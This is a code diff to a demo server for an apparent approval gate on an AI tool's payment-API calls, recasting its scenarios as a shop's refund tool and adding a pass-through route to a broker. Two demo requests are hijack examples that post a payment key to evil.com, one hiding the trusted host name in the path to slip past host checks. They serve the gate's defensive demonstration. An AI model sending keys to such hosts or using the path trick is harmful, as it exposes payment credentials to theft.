@@ -34,14 +34,21 @@ const STANDING_USES = 10
 const now = () => Math.floor(Date.now() / 1000)
 
 // What the tool tries. `what` is the request in a person's words.
+// What the tool tries, as one story: a shop owner's payment-reminder tool.
+// `what` is the request in a person's words.
 const REQUESTS = {
-  usual: { what: 'Read the account balance', method: 'GET', url: 'https://api.stripe.com/v1/balance' },
-  heavy: { what: 'Charge $4,800 → an account nobody has seen before', method: 'POST', url: 'https://api.stripe.com/v1/charges',
-    body: JSON.stringify({ amount: 480000, currency: 'usd', transfer_destination: 'acct_unknown' }) },
-  'denied-host': { what: 'Send the key to evil.com', hijacked: true, method: 'POST', url: 'https://evil.com/v1/charges' },
-  'denied-sneak': { what: 'Send the key to evil.com, with the right name hidden in the path', hijacked: true, method: 'POST', url: 'https://evil.com/api.stripe.com/v1/charges' },
+  // Every morning it looks up who has not paid yet. Reading only.
+  usual: { what: 'Check which orders are still unpaid', method: 'GET', url: 'https://api.stripe.com/v1/invoices?status=open&limit=50' },
+  // A customer sent a bag back and the owner asked for the refund. Money leaves her account, so this
+  // needs her hand even though she asked for it. The real 0G reads a refund as `decisive` most of the
+  // time and `significant` about one time in three, so the demo runs with ZG_ESCALATE=significant:
+  // anything where money moves asks for a press (tools/demo-up.sh sets it).
+  heavy: { what: 'Refund $62 for order #1042 (a returned bag)', method: 'POST', url: 'https://api.stripe.com/v1/refunds',
+    body: JSON.stringify({ charge: 'ch_order_1042', amount: 6200, currency: 'usd', reason: 'requested_by_customer' }) },
+  'denied-host': { what: 'Use your payment key at evil.com', hijacked: true, method: 'POST', url: 'https://evil.com/v1/charges' },
+  'denied-sneak': { what: 'Use your payment key at evil.com, with the right name hidden in the path', hijacked: true, method: 'POST', url: 'https://evil.com/api.stripe.com/v1/charges' },
 }
-REQUESTS.stopped = { ...REQUESTS.heavy, what: 'Charge $4,800 — while 0G cannot be reached' }
+REQUESTS.stopped = { ...REQUESTS.heavy, what: 'Refund $62 for order #1042 — while 0G cannot be reached' }
 const KEYS = { 1: 'usual', 2: 'heavy', 3: 'denied-host', 4: 'denied-sneak', 5: 'stopped' }
 
 // ── what happened, in order. The page reads this. ──
@@ -192,6 +199,17 @@ createServer(async (req, res) => {
   const send = (code, obj) => { res.writeHead(code, { 'content-type': 'application/json', 'access-control-allow-origin': '*', 'access-control-allow-headers': 'content-type' }); res.end(JSON.stringify(obj)) }
   if (req.method === 'OPTIONS') return send(204, {})
   const url = new URL(req.url, 'http://x')
+  // /b/… is passed straight on to the Broker. A phone then needs one public address (this process)
+  // to reach both the tool and the record. Nothing is added or changed on the way.
+  if (url.pathname.startsWith('/b/')) {
+    let raw = ''
+    for await (const c of req) raw += c
+    try {
+      const r = await fetch(BROKER + url.pathname.slice(2) + url.search, { method: req.method, body: req.method === 'GET' ? undefined : raw, signal: AbortSignal.timeout(660000) })
+      res.writeHead(r.status, { 'content-type': 'application/json', 'access-control-allow-origin': '*', 'access-control-allow-headers': 'content-type' })
+      return res.end(await r.text())
+    } catch (e) { return send(502, { error: `Broker not reachable: ${String(e.message ?? e)}` }) }
+  }
   const route = routes[`${req.method} ${url.pathname}`]
   if (!route) return send(404, { error: 'not found' })
   let raw = ''
